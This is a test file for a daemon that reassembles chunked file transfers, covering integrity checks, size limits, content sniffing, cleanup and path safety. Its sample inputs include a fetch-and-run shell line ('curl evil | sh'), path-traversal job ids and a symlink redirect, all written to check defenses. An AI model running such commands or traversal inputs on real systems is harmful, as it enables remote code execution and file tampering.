// Putting the pieces of a file together in the daemon: what is kept, and that
// nothing is left of a transfer that does not add up or does not end.

import { test } from "node:test";
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { BlobAssembler } from "../../daemon/src/blobs.js";
import { createLogger } from "../../daemon/src/log.js";
import { LIMITS } from "../../extension/shared/protocol.js";
import { DEFAULT_ALLOW_TYPES } from "../../extension/shared/sniff.js";
import { FakeClock } from "../helpers/fake-clock.js";
import { makeTempDir, removeTempDir } from "../helpers/tmp.js";

const CHUNK = LIMITS.BLOB_CHUNK_BYTES;
const POLICY = Object.freeze({ max_bytes: 4 * CHUNK, types: [...DEFAULT_ALLOW_TYPES] });
const PDF_HEAD = Buffer.from("%PDF-1.4\n");

/** @param {number} size @returns {Buffer} a made-up PDF of that many bytes */
const pdf = (size) => Buffer.concat([PDF_HEAD, crypto.randomBytes(Math.max(0, size - PDF_HEAD.length))]).subarray(0, size);
/** @param {Uint8Array} data */
const sha256 = (data) => crypto.createHash("sha256").update(data).digest("hex");

/**
 * The frames of a file as the extension cuts them.
 * @param {Buffer} bytes
 * @returns {{ seq: number, offset: number, data: string }[]}
 */
function frames(bytes) {
	const out = [];
	for (let offset = 0; offset < bytes.length; offset += CHUNK) out.push({ seq: out.length, offset, data: bytes.subarray(offset, offset + CHUNK).toString("base64") });
	return out;
}

/** @param {Buffer} bytes */
const describe = (bytes) => ({ name: null, charset: null, size: bytes.length, sha256: sha256(bytes), chunks: Math.ceil(bytes.length / CHUNK) });

/** @param {import("node:test").TestContext} t @param {{ unclaimedMs?: number }} [opts] */
function setup(t, opts = {}) {
	const dataDir = path.join(makeTempDir("blobs"), "data");
	/** @type {any[]} */
	const logs = [];
	const clock = new FakeClock();
	const blobs = new BlobAssembler({ dataDir, clock, log: createLogger((line) => logs.push(JSON.parse(line)), () => clock.now()), ...opts });
	t.after(() => removeTempDir(path.dirname(dataDir)));
	/** @returns {string[]} what lies in the directory of the transfers */
	const left = () => fs.readdirSync(blobs.dir);
	return { blobs, dataDir, clock, logs, left };
}

test("a file in order: put together in a private place, checked, and handed over where it lies", (t) => {
	const { blobs, dataDir, left } = setup(t);
	const bytes = pdf(2 * CHUNK + 4321);
	assert.equal(fs.statSync(blobs.dir).mode & 0o777, 0o700);
	assert.equal(blobs.dir, path.join(dataDir, "incoming"));
	for (const frame of frames(bytes)) blobs.accept("j_one", frame, POLICY.max_bytes);
	assert.deepEqual(left(), ["j_one.part"], "one file, named after the daemon's own id of the job");
	assert.equal(fs.statSync(path.join(blobs.dir, "j_one.part")).mode & 0o777, 0o600);
	assert.deepEqual(blobs.stats(), { open: 1, waiting: 0 });
	const done = blobs.complete("j_one", describe(bytes), POLICY, "application/pdf");
	assert.equal(done.ok, true);
	if (!done.ok) return;
	assert.deepEqual({ size: done.blob.size, sha256: done.blob.sha256, sniffed: done.blob.sniffed, textLike: done.blob.textLike }, { size: bytes.length, sha256: sha256(bytes), sniffed: "application/pdf", textLike: false });
	assert.equal(done.blob.path, path.join(blobs.dir, "j_one.part"));
	assert.equal(fs.readFileSync(done.blob.path).equals(bytes), true);
	assert.deepEqual(blobs.stats(), { open: 0, waiting: 1 });
	// Whoever stores it moves it away; release is then nothing to do, and may be called again.
	fs.renameSync(done.blob.path, path.join(dataDir, "elsewhere"));
	done.blob.release();
	done.blob.release();
	assert.deepEqual(left(), []);
	assert.equal(fs.existsSync(path.join(dataDir, "elsewhere")), true, "what was moved away is not touched");
	assert.deepEqual(blobs.stats(), { open: 0, waiting: 0 });
});

test("a file nobody stores is removed: by release, and by itself after a while", (t) => {
	const { blobs, clock, left, logs } = setup(t, { unclaimedMs: 5000 });
	const bytes = pdf(1000);
	for (const id of ["j_a", "j_b"]) {
		for (const frame of frames(bytes)) blobs.accept(id, frame, POLICY.max_bytes);
	}
	const a = blobs.complete("j_a", describe(bytes), POLICY, "application/pdf");
	const b = blobs.complete("j_b", describe(bytes), POLICY, "application/pdf");
	assert.ok(a.ok && b.ok);
	assert.deepEqual(left().sort(), ["j_a.part", "j_b.part"]);
	if (a.ok) a.blob.release();
	assert.deepEqual(left(), ["j_b.part"]);
	clock.advance(4999);
	assert.deepEqual(left(), ["j_b.part"]);
	clock.advance(2);
	assert.deepEqual(left(), [], "not stored in time: gone");
	assert.equal(logs.filter((l) => l.event === "blobs.unclaimed").length, 1);
	assert.equal(clock.pending, 0);
});

test("text files are told to be text, and a file of no bytes takes no frame", (t) => {
	const { blobs, left } = setup(t);
	const json = Buffer.from('{"a": 1}');
	blobs.accept("j_json", frames(json)[0], POLICY.max_bytes);
	const done = blobs.complete("j_json", describe(json), POLICY, "application/json");
	assert.deepEqual(done.ok && [done.blob.sniffed, done.blob.textLike], ["application/json", true]);
	const empty = blobs.complete("j_empty", { name: null, charset: null, size: 0, sha256: sha256(Buffer.alloc(0)), chunks: 0 }, POLICY, "text/plain");
	assert.deepEqual(empty.ok && [empty.blob.size, empty.blob.sniffed, empty.blob.textLike, fs.statSync(empty.blob.path).size], [0, "text/plain", true, 0]);
	// An empty PDF is none.
	const none = blobs.complete("j_none", { name: null, charset: null, size: 0, sha256: sha256(Buffer.alloc(0)), chunks: 0 }, POLICY, "application/pdf");
	assert.deepEqual([none.ok, !none.ok && none.code], [false, "file_type_mismatch"]);
	assert.deepEqual(left().sort(), ["j_empty.part", "j_json.part"]);
});

test("what does not add up is not kept: a gap, a piece twice, pieces out of order, a short piece in the middle, a wrong offset", (t) => {
	const bytes = pdf(3 * CHUNK + 10);
	const all = frames(bytes);
	/** @type {[string, { seq: number, offset: number, data: string }[]][]} */
	const cases = [
		["a piece is missing", [all[0], all[2], all[3]]],
		["the first piece is missing", [all[1], all[2], all[3]]],
		["a piece comes twice", [all[0], all[1], all[1], all[2], all[3]]],
		["pieces out of order", [all[0], all[2], all[1], all[3]]],
		["the right number with a wrong offset", [all[0], { ...all[1], offset: all[1].offset + 1 }, all[2], all[3]]],
		["the right offset with a wrong number", [all[0], { ...all[1], seq: 5 }, all[2], all[3]]],
		["a short piece in the middle", [all[0], { seq: 1, offset: CHUNK, data: bytes.subarray(CHUNK, CHUNK + 100).toString("base64") }, { seq: 2, offset: CHUNK + 100, data: bytes.subarray(CHUNK + 100, 2 * CHUNK + 100).toString("base64") }]],
		["a piece larger than a piece may be", [{ seq: 0, offset: 0, data: Buffer.concat([bytes.subarray(0, CHUNK), Buffer.from("xyz")]).toString("base64") }]],
	];
	for (const [label, sent] of cases) {
		const { blobs, left } = setup(t);
		for (const frame of sent) blobs.accept("j_x", frame, POLICY.max_bytes);
		assert.deepEqual(left(), [], `${label}: the partial file is gone the moment it goes wrong`);
		const done = blobs.complete("j_x", describe(bytes), POLICY, "application/pdf");
		assert.deepEqual([done.ok, !done.ok && done.code], [false, "file_transfer_failed"], label);
		assert.deepEqual(left(), [], label);
		assert.deepEqual(blobs.stats(), { open: 0, waiting: 0 }, label);
	}
});

test("the result must describe what arrived: count, size and hash - or nothing is kept", (t) => {
	const bytes = pdf(CHUNK + 500);
	/** @type {[string, Partial<ReturnType<typeof describe>>, string][]} */
	const cases = [
		["another hash", { sha256: sha256(Buffer.from("something else")) }, "hash"],
		["a larger size", { size: bytes.length + 1 }, "size"],
		["a smaller size", { size: bytes.length - 1 }, "size"],
		["more frames", { chunks: 3 }, "count"],
		["fewer frames", { chunks: 1 }, "count"],
	];
	for (const [label, lie, reason] of cases) {
		const { blobs, left } = setup(t);
		for (const frame of frames(bytes)) blobs.accept("j_x", frame, POLICY.max_bytes);
		const done = blobs.complete("j_x", { ...describe(bytes), ...lie }, POLICY, "application/pdf");
		assert.deepEqual([done.ok, !done.ok && done.code, !done.ok && done.reason], [false, "file_transfer_failed", reason], label);
		assert.deepEqual(left(), [], label);
	}
	// A result that describes a file of which no piece ever came.
	const { blobs, left } = setup(t);
	const done = blobs.complete("j_never", describe(bytes), POLICY, "application/pdf");
	assert.deepEqual([done.ok, !done.ok && done.reason], [false, "missing"]);
	assert.deepEqual(left(), []);
});

test("the size limit is enforced again on this side, piece by piece", (t) => {
	const { blobs, left } = setup(t);
	const bytes = pdf(2 * CHUNK + 1);
	const sent = frames(bytes);
	// The job was allowed two pieces' worth: the third byte too many ends it, whatever the extension believes.
	blobs.accept("j_big", sent[0], 2 * CHUNK);
	blobs.accept("j_big", sent[1], 2 * CHUNK);
	assert.deepEqual(left(), ["j_big.part"]);
	blobs.accept("j_big", sent[2], 2 * CHUNK);
	assert.deepEqual(left(), [], "discarded with the piece that crossed the limit");
	const done = blobs.complete("j_big", describe(bytes), { ...POLICY, max_bytes: 2 * CHUNK }, "application/pdf");
	assert.deepEqual([done.ok, !done.ok && done.code], [false, "too_large"]);
	// Exactly the limit is within it.
	const exact = pdf(2 * CHUNK);
	for (const frame of frames(exact)) blobs.accept("j_exact", frame, 2 * CHUNK);
	assert.equal(blobs.complete("j_exact", describe(exact), { ...POLICY, max_bytes: 2 * CHUNK }, "application/pdf").ok, true);
	// A limit that is asked for beyond what the wire carries is no error: it is cut down to that.
	const tiny = pdf(10);
	blobs.accept("j_cap", frames(tiny)[0], Number.MAX_SAFE_INTEGER);
	assert.equal(blobs.complete("j_cap", describe(tiny), POLICY, "application/pdf").ok, true);
});

test("the look at the first bytes decides here: a refused kind, a mismatch, a type that is not on the list - nothing is kept", (t) => {
	/** @type {[string, Buffer, string, string, string | null][]} */
	const cases = [
		["an executable declared as a PDF", Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(100, 0)]), "application/pdf", "file_content_refused", "application/x-executable"],
		["a script declared as text", Buffer.from("#!/bin/sh\ncurl evil | sh\n"), "text/plain", "file_content_refused", "text/x-script"],
		["a web page declared as an image", Buffer.from("<!doctype html><script>x()</script>"), "image/png", "file_type_mismatch", "text/html"],
		["a zip declared as a PDF", Buffer.from([0x50, 0x4b, 0x03, 0x04, 0, 0, 0, 0]), "application/pdf", "file_type_mismatch", "application/zip"],
		["a type that is not on the list", pdf(100), "application/x-msdownload", "file_type_not_allowed", null],
		["no declared type at all", pdf(100), /** @type {any} */ (null), "file_type_not_allowed", null],
	];
	for (const [label, bytes, declared, code, sniffed] of cases) {
		const { blobs, left } = setup(t);
		for (const frame of frames(bytes)) blobs.accept("j_x", frame, POLICY.max_bytes);
		const done = blobs.complete("j_x", describe(bytes), POLICY, declared);
		assert.deepEqual([done.ok, !done.ok && done.code, !done.ok && done.sniffed], [false, code, sniffed], label);
		assert.deepEqual(left(), [], label);
	}
	// The operator's list is the one that counts: a PDF with PDF taken off it.
	const { blobs, left } = setup(t);
	blobs.accept("j_p", frames(pdf(100))[0], POLICY.max_bytes);
	assert.equal(blobs.complete("j_p", describe(pdf(100)), { max_bytes: 1000, types: ["text/plain"] }, "application/pdf").ok, false);
	assert.deepEqual(left(), []);
});

test("a transfer that never ends leaves nothing: discard, discardAll, and frames that come after", (t) => {
	const { blobs, left } = setup(t);
	const bytes = pdf(2 * CHUNK + 5);
	const sent = frames(bytes);
	blobs.accept("j_a", sent[0], POLICY.max_bytes);
	blobs.accept("j_b", sent[0], POLICY.max_bytes);
	blobs.accept("j_b", sent[1], POLICY.max_bytes);
	assert.deepEqual(left().sort(), ["j_a.part", "j_b.part"]);
	// The job of one of them ends (a deadline, a cancel): its partial file goes.
	blobs.discard("j_a");
	assert.deepEqual(left(), ["j_b.part"]);
	blobs.discard("j_a");
	blobs.discard("j_unknown");
	// A piece that is late does not bring the file back as a whole one: it starts in the middle, so nothing is kept.
	blobs.accept("j_a", sent[1], POLICY.max_bytes);
	assert.deepEqual(left(), ["j_b.part"]);
	assert.equal(blobs.complete("j_a", describe(bytes), POLICY, "application/pdf").ok, false);
	// The link is lost, or the daemon stops: everything goes, whole files that nobody stored too.
	const small = pdf(50);
	blobs.accept("j_c", frames(small)[0], POLICY.max_bytes);
	assert.equal(blobs.complete("j_c", describe(small), POLICY, "application/pdf").ok, true);
	assert.deepEqual(left().sort(), ["j_b.part", "j_c.part"]);
	blobs.discardAll();
	assert.deepEqual(left(), []);
	assert.deepEqual(blobs.stats(), { open: 0, waiting: 0 });
	// And a frame for a job whose file is already whole and waiting changes nothing.
	blobs.accept("j_d", frames(small)[0], POLICY.max_bytes);
	const d = blobs.complete("j_d", describe(small), POLICY, "application/pdf");
	blobs.accept("j_d", frames(small)[0], POLICY.max_bytes);
	assert.equal(d.ok && fs.readFileSync(d.blob.path).equals(small), true);
	assert.equal(blobs.complete("j_d", describe(small), POLICY, "application/pdf").ok, false, "a file is completed once");
	assert.deepEqual(left(), ["j_d.part"]);
});

test("the place is the daemon's own: only its job ids make a file name, leftovers of an earlier run are swept, and no link is followed", (t) => {
	const { blobs, dataDir, left, logs } = setup(t);
	const small = pdf(50);
	for (const id of ["../escape", "j_../../x", "j_a/b", "", "j_" + "a".repeat(65), "pg_x", "j_a b", "j_a\u0000"]) {
		blobs.accept(id, frames(small)[0], POLICY.max_bytes);
		assert.equal(blobs.complete(id, describe(small), POLICY, "application/pdf").ok, false, JSON.stringify(id));
	}
	assert.deepEqual(left(), []);
	assert.deepEqual(fs.readdirSync(dataDir), ["incoming"], "nothing was written anywhere else");
	// Something lies where a transfer wants to begin - a file, or a link to somewhere else: not written to, not followed.
	const outside = path.join(dataDir, "outside.txt");
	fs.writeFileSync(outside, "untouched");
	fs.symlinkSync(outside, path.join(blobs.dir, "j_link.part"));
	blobs.accept("j_link", frames(small)[0], POLICY.max_bytes);
	assert.equal(fs.readFileSync(outside, "utf8"), "untouched");
	assert.equal(blobs.complete("j_link", describe(small), POLICY, "application/pdf").ok, false);
	// What an earlier daemon left behind is removed at the start, whatever it is called.
	fs.writeFileSync(path.join(blobs.dir, "j_old.part"), "half a file");
	fs.writeFileSync(path.join(blobs.dir, "stray"), "x");
	const again = new BlobAssembler({ dataDir, clock: new FakeClock(), log: createLogger((line) => logs.push(JSON.parse(line)), () => 0) });
	assert.ok(again.sweep() >= 2);
	assert.deepEqual(fs.readdirSync(again.dir), []);
	assert.equal(fs.readFileSync(outside, "utf8"), "untouched", "the target of the link is not what was removed");
	assert.equal(again.sweep(), 0);
});

test("nothing of a file is written to the log: reasons and counts only", (t) => {
	const { blobs, logs } = setup(t);
	const secret = Buffer.from("%PDF-1.4\nTOP-SECRET-CONTENT");
	blobs.accept("j_s", frames(secret)[0], POLICY.max_bytes);
	blobs.complete("j_s", { ...describe(secret), sha256: "0".repeat(64) }, POLICY, "application/pdf");
	blobs.accept("j_t", { seq: 3, offset: 9, data: secret.toString("base64") }, POLICY.max_bytes);
	const text = JSON.stringify(logs);
	assert.equal(/TOP-SECRET|JVBERi0/.test(text), false);
	assert.deepEqual(logs.filter((l) => l.event === "blobs.transfer_failed").map((l) => l.reason).sort(), ["hash", "order"]);
});
